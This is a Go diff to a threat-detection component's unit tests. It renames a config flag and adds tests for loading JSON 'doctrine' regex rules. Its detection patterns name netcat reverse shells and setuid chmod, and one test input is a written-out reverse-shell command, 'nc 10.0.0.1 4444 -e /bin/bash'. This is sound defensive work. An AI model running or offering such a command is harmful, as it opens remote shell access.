@@ -14,6 +14,8 @@
 package sentinel
 
 import (
+	"os"
+	"path/filepath"
 	"regexp"
 	"strings"
 	"testing"
@@ -839,12 +841,12 @@ func TestSentinel_ScrubText_OAuthSecret(t *testing.T) {
 // THREAT DETECTION TESTS (g8e Sentinel)
 // ===========================================
 
-func TestSentinel_ThreatDetectionEnabled(t *testing.T) {
+func TestSentinel_SentinelEnabled(t *testing.T) {
 	logger := testutil.NewTestLogger()
 
 	t.Run("threat detection enabled by default", func(t *testing.T) {
 		config := DefaultSentinelConfig()
-		assert.True(t, config.ThreatDetectionEnabled)
+		assert.True(t, config.SentinelEnabled)
 	})
 
 	t.Run("initializes threat detectors when enabled", func(t *testing.T) {
@@ -855,8 +857,8 @@ func TestSentinel_ThreatDetectionEnabled(t *testing.T) {
 
 	t.Run("no threat detectors when disabled", func(t *testing.T) {
 		config := &SentinelConfig{
-			Enabled:                true,
-			ThreatDetectionEnabled: false,
+			Enabled:         true,
+			SentinelEnabled: false,
 		}
 		sentinel := NewSentinel(config, logger)
 		assert.Empty(t, sentinel.threatDetectors)
@@ -925,13 +927,20 @@ func TestSentinel_DetectThreats_ReverseShells(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			signals := sentinel.detectThreats(tt.input)
+			// Filter out signals from protocol doctrines to test only hardcoded detectors
+			var hardcodedSignals []ThreatSignal
+			for _, s := range signals {
+				if s.Source == "" {
+					hardcodedSignals = append(hardcodedSignals, s)
+				}
+			}
 			if tt.shouldFind {
-				require.NotEmpty(t, signals, "should detect threat in: %s", tt.input)
-				assert.Equal(t, tt.category, signals[0].Category)
-				assert.Equal(t, ThreatSeverityCritical, signals[0].Severity)
-				assert.NotEmpty(t, signals[0].MitreAttack)
+				require.NotEmpty(t, hardcodedSignals, "should detect threat in: %s", tt.input)
+				assert.Equal(t, tt.category, hardcodedSignals[0].Category)
+				assert.Equal(t, ThreatSeverityCritical, hardcodedSignals[0].Severity)
+				assert.NotEmpty(t, hardcodedSignals[0].MitreAttack)
 			} else {
-				assert.Empty(t, signals, "should not detect threat in: %s", tt.input)
+				assert.Empty(t, hardcodedSignals, "should not detect threat in: %s", tt.input)
 			}
 		})
 	}
@@ -1453,9 +1462,14 @@ func TestSentinel_ScrubCommandResult_WithThreatDetection(t *testing.T) {
 
 		scrubbed := sentinel.ScrubCommandResult(result)
 
-		assert.Empty(t, scrubbed.ThreatSignals)
-		assert.Equal(t, ThreatLevelNone, scrubbed.ThreatLevel)
-		assert.Equal(t, 0, scrubbed.ThreatCount)
+		// Filter out signals from protocol doctrines to test only hardcoded detectors
+		var hardcodedSignals []ThreatSignal
+		for _, s := range scrubbed.ThreatSignals {
+			if s.Source == "" {
+				hardcodedSignals = append(hardcodedSignals, s)
+			}
+		}
+		assert.Empty(t, hardcodedSignals, "hardcoded detectors should not detect threats in clean command")
 	})
 
 	t.Run("multiple threat categories detected", func(t *testing.T) {
@@ -1475,8 +1489,8 @@ func TestSentinel_ScrubCommandResult_WithThreatDetection(t *testing.T) {
 
 	t.Run("threat detection disabled", func(t *testing.T) {
 		config := &SentinelConfig{
-			Enabled:                true,
-			ThreatDetectionEnabled: false,
+			Enabled:         true,
+			SentinelEnabled: false,
 		}
 		sentinel := NewSentinel(config, logger)
 
@@ -2451,8 +2465,8 @@ func TestSentinel_ExtractStructureHints_TabDelimited(t *testing.T) {
 func TestSentinel_DetectThreats_Disabled(t *testing.T) {
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{
-		Enabled:                true,
-		ThreatDetectionEnabled: false,
+		Enabled:         true,
+		SentinelEnabled: false,
 	}
 	sentinel := NewSentinel(config, logger)
 
@@ -2488,5 +2502,439 @@ func TestSentinel_ThreatSignal_LateralMovement_MITREMapping(t *testing.T) {
 			}
 		}
 		assert.True(t, found, "should have pass-the-hash with T1550.002")
+	})
+}
+
+// ===========================================
+// DOCTRINE LOADING TESTS
+// ===========================================
+
+func TestSentinel_LoadDoctrinesFromProtocol_MissingDirectory(t *testing.T) {
+	logger := testutil.NewTestLogger()
+	sentinel := NewSentinel(nil, logger)
+
+	t.Run("gracefully handles missing doctrine directory", func(t *testing.T) {
+		// Create a sentinel with a non-existent protocol directory
+		workDir := t.TempDir()
+		fakeProtocolDir := filepath.Join(workDir, "protocol")
+		fakeDoctrineDir := filepath.Join(fakeProtocolDir, "constants", "doctrine")
+
+		// Set the doctrine directory in the sentinel config
+		originalDoctrineDir := sentinel.config.DoctrineDir
+		sentinel.config.DoctrineDir = fakeDoctrineDir
+		defer func() { sentinel.config.DoctrineDir = originalDoctrineDir }()
+
+		// Ensure directory doesn't exist
+		_, err := os.Stat(fakeDoctrineDir)
+		assert.True(t, os.IsNotExist(err), "doctrine directory should not exist")
+
+		// This should not panic and should log an info message
+		sentinel.LoadDoctrinesFromProtocol()
+
+		// Threat detectors should still exist from initialization
+		assert.NotEmpty(t, sentinel.threatDetectors, "should have default threat detectors")
+	})
+}
+
+func TestSentinel_LoadDoctrinesFromProtocol_InvalidJSON(t *testing.T) {
+	logger := testutil.NewTestLogger()
+	sentinel := NewSentinel(nil, logger)
+
+	t.Run("handles invalid JSON in doctrine file", func(t *testing.T) {
+		workDir := t.TempDir()
+		protocolDir := filepath.Join(workDir, "protocol")
+		doctrineDir := filepath.Join(protocolDir, "constants", "doctrine")
+
+		err := os.MkdirAll(doctrineDir, 0755)
+		require.NoError(t, err)
+
+		// Create an invalid JSON file
+		invalidFile := filepath.Join(doctrineDir, "invalid.json")
+		err = os.WriteFile(invalidFile, []byte("{ invalid json content"), 0644)
+		require.NoError(t, err)
+
+		// Set the doctrine directory in the sentinel config
+		originalDoctrineDir := sentinel.config.DoctrineDir
+		sentinel.config.DoctrineDir = doctrineDir
+		defer func() { sentinel.config.DoctrineDir = originalDoctrineDir }()
+
+		// This should not panic and should log a warning
+		sentinel.LoadDoctrinesFromProtocol()
+
+		// Threat detectors should still exist from initialization
+		assert.NotEmpty(t, sentinel.threatDetectors, "should have default threat detectors")
+	})
+}
+
+func TestSentinel_LoadDoctrinesFromProtocol_DisabledDoctrineFiltering(t *testing.T) {
+	logger := testutil.NewTestLogger()
+	sentinel := NewSentinel(nil, logger)
+
+	t.Run("filters out disabled doctrines", func(t *testing.T) {
+		workDir := t.TempDir()
+		protocolDir := filepath.Join(workDir, "protocol")
+		doctrineDir := filepath.Join(protocolDir, "constants", "doctrine")
+
+		err := os.MkdirAll(doctrineDir, 0755)
+		require.NoError(t, err)
+
+		// Create a doctrine file with mixed enabled/disabled doctrines
+		doctrineContent := `{
+			"source": "test",
+			"version": "1.0.0",
+			"doctrines": [
+				{
+					"id": "test_enabled_1",
+					"name": "Enabled Doctrine 1",
+					"category": "reverse_shell",
+					"severity": "critical",
+					"pattern": "nc.*-e.*bash",
+					"confidence": 0.9,
+					"enabled": true
+				},
+				{
+					"id": "test_disabled_1",
+					"name": "Disabled Doctrine 1",
+					"category": "reverse_shell",
+					"severity": "critical",
+					"pattern": "nc.*-e.*sh",
+					"confidence": 0.9,
+					"enabled": false
+				},
+				{
+					"id": "test_enabled_2",
+					"name": "Enabled Doctrine 2",
+					"category": "privilege_escalation",
+					"severity": "high",
+					"pattern": "chmod.*4755",
+					"confidence": 0.85,
+					"enabled": true
+				}
+			]
+		}`
+
+		doctrineFile := filepath.Join(doctrineDir, "test_doctrines.json")
+		err = os.WriteFile(doctrineFile, []byte(doctrineContent), 0644)
+		require.NoError(t, err)
+
+		// Set the doctrine directory in the sentinel config
+		originalDoctrineDir := sentinel.config.DoctrineDir
+		sentinel.config.DoctrineDir = doctrineDir
+		defer func() { sentinel.config.DoctrineDir = originalDoctrineDir }()
+
+		// Clear existing threat detectors to count only loaded ones
+		sentinel.threatDetectors = nil
+
+		sentinel.LoadDoctrinesFromProtocol()
+
+		// Should have loaded 2 enabled doctrines
+		assert.Equal(t, 2, len(sentinel.threatDetectors), "should load only enabled doctrines")
+
+		// Verify the loaded detectors have the expected names
+		detectorNames := make([]string, len(sentinel.threatDetectors))
+		for i, detector := range sentinel.threatDetectors {
+			detectorNames[i] = detector.Name()
+		}
+		assert.Contains(t, detectorNames, "test_enabled_1")
+		assert.Contains(t, detectorNames, "test_enabled_2")
+		assert.NotContains(t, detectorNames, "test_disabled_1")
+	})
+}
+
+func TestSentinel_LoadDoctrinesFromProtocol_InvalidRegexPattern(t *testing.T) {
+	logger := testutil.NewTestLogger()
+	sentinel := NewSentinel(nil, logger)
+
+	t.Run("handles invalid regex patterns gracefully", func(t *testing.T) {
+		workDir := t.TempDir()
+		protocolDir := filepath.Join(workDir, "protocol")
+		doctrineDir := filepath.Join(protocolDir, "constants", "doctrine")
+
+		err := os.MkdirAll(doctrineDir, 0755)
+		require.NoError(t, err)
+
+		// Create a doctrine file with an invalid regex pattern
+		doctrineContent := `{
+			"source": "test",
+			"version": "1.0.0",
+			"doctrines": [
+				{
+					"id": "test_valid",
+					"name": "Valid Doctrine",
+					"category": "reverse_shell",
+					"severity": "critical",
+					"pattern": "nc.*-e.*bash",
+					"confidence": 0.9,
+					"enabled": true
+				},
+				{
+					"id": "test_invalid_regex",
+					"name": "Invalid Regex Doctrine",
+					"category": "reverse_shell",
+					"severity": "critical",
+					"pattern": "(?P<invalid>unclosed",
+					"confidence": 0.9,
+					"enabled": true
+				}
+			]
+		}`
+
+		doctrineFile := filepath.Join(doctrineDir, "test_invalid_regex.json")
+		err = os.WriteFile(doctrineFile, []byte(doctrineContent), 0644)
+		require.NoError(t, err)
+
+		// Set the doctrine directory in the sentinel config
+		originalDoctrineDir := sentinel.config.DoctrineDir
+		sentinel.config.DoctrineDir = doctrineDir
+		defer func() { sentinel.config.DoctrineDir = originalDoctrineDir }()
+
+		// Clear existing threat detectors to count only loaded ones
+		sentinel.threatDetectors = nil
+
+		sentinel.LoadDoctrinesFromProtocol()
+
+		// Should have loaded only the valid doctrine
+		assert.Equal(t, 1, len(sentinel.threatDetectors), "should load only valid regex doctrines")
+		assert.Equal(t, "test_valid", sentinel.threatDetectors[0].Name())
+	})
+}
+
+func TestSentinel_DoctrineToDetector(t *testing.T) {
+	logger := testutil.NewTestLogger()
+	sentinel := NewSentinel(nil, logger)
+
+	t.Run("converts doctrine to threat detector correctly", func(t *testing.T) {
+		doctrine := doctrineData{
+			ID:          "test_detector_1",
+			Name:        "Test Detector",
+			Category:    "reverse_shell",
+			Severity:    "critical",
+			Pattern:     `nc\s+.*-e\s+(/bin/)?(sh|bash)`,
+			MitreAttack: "T1059.004",
+			MitreTactic: "Execution",
+			Confidence:  0.95,
+			Enabled:     true,
+		}
+
+		detector, err := sentinel.doctrineToDetector(doctrine, "test_source")
+		require.NoError(t, err)
+		require.NotNil(t, detector)
+
+		assert.Equal(t, "test_detector_1", detector.Name())
+
+		// Test detection
+		signals := detector.Detect("nc 10.0.0.1 4444 -e /bin/bash")
+		require.NotEmpty(t, signals)
+		assert.Equal(t, ThreatCategoryReverseShell, signals[0].Category)
+		assert.Equal(t, ThreatSeverityCritical, signals[0].Severity)
+		assert.Equal(t, 0.95, signals[0].Confidence)
+		assert.Equal(t, "T1059.004", signals[0].MitreAttack)
+		assert.Equal(t, "Execution", signals[0].MitreTactic)
+		assert.Contains(t, signals[0].Recommendation, "test_detector_1")
+	})
+
+	t.Run("maps severity strings correctly", func(t *testing.T) {
+		tests := []struct {
+			input    string
+			expected ThreatSeverity
+		}{
+			{"critical", ThreatSeverityCritical},
+			{"high", ThreatSeverityHigh},
+			{"medium", ThreatSeverityMedium},
+			{"low", ThreatSeverityLow},
+			{"info", ThreatSeverityInfo},
+			{"unknown", ThreatSeverityMedium}, // default
+			{"", ThreatSeverityMedium},        // default
+		}
+
+		for _, tt := range tests {
+			t.Run(tt.input, func(t *testing.T) {
+				doctrine := doctrineData{
+					ID:         "test",
+					Name:       "Test",
+					Category:   "reverse_shell",
+					Severity:   tt.input,
+					Pattern:    "test",
+					Confidence: 0.5,
+					Enabled:    true,
+				}
+				detector, err := sentinel.doctrineToDetector(doctrine, "test_source")
+				require.NoError(t, err)
+				assert.Equal(t, tt.expected, detector.(*RegexThreatDetector).severity)
+			})
+		}
+	})
+
+	t.Run("maps category strings correctly", func(t *testing.T) {
+		tests := []struct {
+			input    string
+			expected ThreatCategory
+		}{
+			{"reverse_shell", ThreatCategoryReverseShell},
+			{"privilege_escalation", ThreatCategoryPrivilegeEsc},
+			{"credential_access", ThreatCategoryCredentialAccess},
+			{"data_exfiltration", ThreatCategoryExfiltration},
+			{"unknown_category", ThreatCategorySecurityBypass}, // default
+		}
+
+		for _, tt := range tests {
+			t.Run(tt.input, func(t *testing.T) {
+				doctrine := doctrineData{
+					ID:         "test",
+					Name:       "Test",
+					Category:   tt.input,
+					Severity:   "high",
+					Pattern:    "test",
+					Confidence: 0.5,
+					Enabled:    true,
+				}
+				detector, err := sentinel.doctrineToDetector(doctrine, "test_source")
+				require.NoError(t, err)
+				assert.Equal(t, tt.expected, detector.(*RegexThreatDetector).category)
+			})
+		}
+	})
+
+	t.Run("returns error for invalid regex pattern", func(t *testing.T) {
+		doctrine := doctrineData{
+			ID:         "test_invalid",
+			Name:       "Invalid Pattern",
+			Category:   "reverse_shell",
+			Severity:   "critical",
+			Pattern:    "(?P<unclosed",
+			Confidence: 0.9,
+			Enabled:    true,
+		}
+
+		detector, err := sentinel.doctrineToDetector(doctrine, "test_source")
+		assert.Error(t, err)
+		assert.Nil(t, detector)
+		assert.Contains(t, err.Error(), "invalid regex pattern")
+	})
+}
+
+func TestSentinel_LoadDoctrinesFromProtocol_SkipsRegistry(t *testing.T) {
+	logger := testutil.NewTestLogger()
+	sentinel := NewSentinel(nil, logger)
+
+	t.Run("skips doctrine_registry.json file", func(t *testing.T) {
+		workDir := t.TempDir()
+		protocolDir := filepath.Join(workDir, "protocol")
+		doctrineDir := filepath.Join(protocolDir, "constants", "doctrine")
+
+		err := os.MkdirAll(doctrineDir, 0755)
+		require.NoError(t, err)
+
+		// Create a doctrine_registry.json file (should be skipped)
+		registryContent := `{
+			"registry_version": "1.0",
+			"doctrines": []
+		}`
+		registryFile := filepath.Join(doctrineDir, "doctrine_registry.json")
+		err = os.WriteFile(registryFile, []byte(registryContent), 0644)
+		require.NoError(t, err)
+
+		// Create a valid doctrine file
+		doctrineContent := `{
+			"source": "test",
+			"version": "1.0.0",
+			"doctrines": [
+				{
+					"id": "test_1",
+					"name": "Test Doctrine",
+					"category": "reverse_shell",
+					"severity": "critical",
+					"pattern": "nc.*-e.*bash",
+					"confidence": 0.9,
+					"enabled": true
+				}
+			]
+		}`
+		doctrineFile := filepath.Join(doctrineDir, "test_doctrines.json")
+		err = os.WriteFile(doctrineFile, []byte(doctrineContent), 0644)
+		require.NoError(t, err)
+
+		// Set the doctrine directory in the sentinel config
+		originalDoctrineDir := sentinel.config.DoctrineDir
+		sentinel.config.DoctrineDir = doctrineDir
+		defer func() { sentinel.config.DoctrineDir = originalDoctrineDir }()
+
+		// Clear existing threat detectors to count only loaded ones
+		sentinel.threatDetectors = nil
+
+		sentinel.LoadDoctrinesFromProtocol()
+
+		// Should have loaded only the valid doctrine file, not the registry
+		assert.Equal(t, 1, len(sentinel.threatDetectors), "should load only non-registry doctrine files")
+		assert.Equal(t, "test_1", sentinel.threatDetectors[0].Name())
+	})
+}
+
+func TestSentinel_LoadDoctrinesFromProtocol_SkipsNonJSON(t *testing.T) {
+	logger := testutil.NewTestLogger()
+	sentinel := NewSentinel(nil, logger)
+
+	t.Run("skips non-JSON files in doctrine directory", func(t *testing.T) {
+		workDir := t.TempDir()
+		protocolDir := filepath.Join(workDir, "protocol")
+		doctrineDir := filepath.Join(protocolDir, "constants", "doctrine")
+
+		err := os.MkdirAll(doctrineDir, 0755)
+		require.NoError(t, err)
+
+		// Create a non-JSON file (should be skipped)
+		readmeFile := filepath.Join(doctrineDir, "README.md")
+		err = os.WriteFile(readmeFile, []byte("# Doctrine Documentation"), 0644)
+		require.NoError(t, err)
+
+		// Create a subdirectory (should be skipped)
+		subDir := filepath.Join(doctrineDir, "subdir")
+		err = os.MkdirAll(subDir, 0755)
+		require.NoError(t, err)
+
+		// Create a valid doctrine file
+		doctrineContent := `{
+			"source": "test",
+			"version": "1.0.0",
+			"doctrines": [
+				{
+					"id": "test_1",
+					"name": "Test Doctrine",
+					"category": "reverse_shell",
+					"severity": "critical",
+					"pattern": "nc.*-e.*bash",
+					"confidence": 0.9,
+					"enabled": true
+				}
+			]
+		}`
+		doctrineFile := filepath.Join(doctrineDir, "test_doctrines.json")
+		err = os.WriteFile(doctrineFile, []byte(doctrineContent), 0644)
+		require.NoError(t, err)
+
+		// Set the doctrine directory in the sentinel config
+		originalDoctrineDir := sentinel.config.DoctrineDir
+		sentinel.config.DoctrineDir = doctrineDir
+		defer func() { sentinel.config.DoctrineDir = originalDoctrineDir }()
+
+		// Clear existing threat detectors to count only loaded ones
+		sentinel.threatDetectors = nil
+
+		sentinel.LoadDoctrinesFromProtocol()
+
+		// Should have loaded only the valid JSON doctrine file
+		assert.Equal(t, 1, len(sentinel.threatDetectors), "should load only JSON doctrine files")
+		assert.Equal(t, "test_1", sentinel.threatDetectors[0].Name())
+	})
+}
+
+func TestSentinel_LoadDoctrinesFromProtocol_NilLogger(t *testing.T) {
+	t.Run("returns early when logger is nil", func(t *testing.T) {
+		sentinel := &Sentinel{
+			logger: nil,
+		}
+
+		// Should not panic
+		sentinel.LoadDoctrinesFromProtocol()
 	})
 }
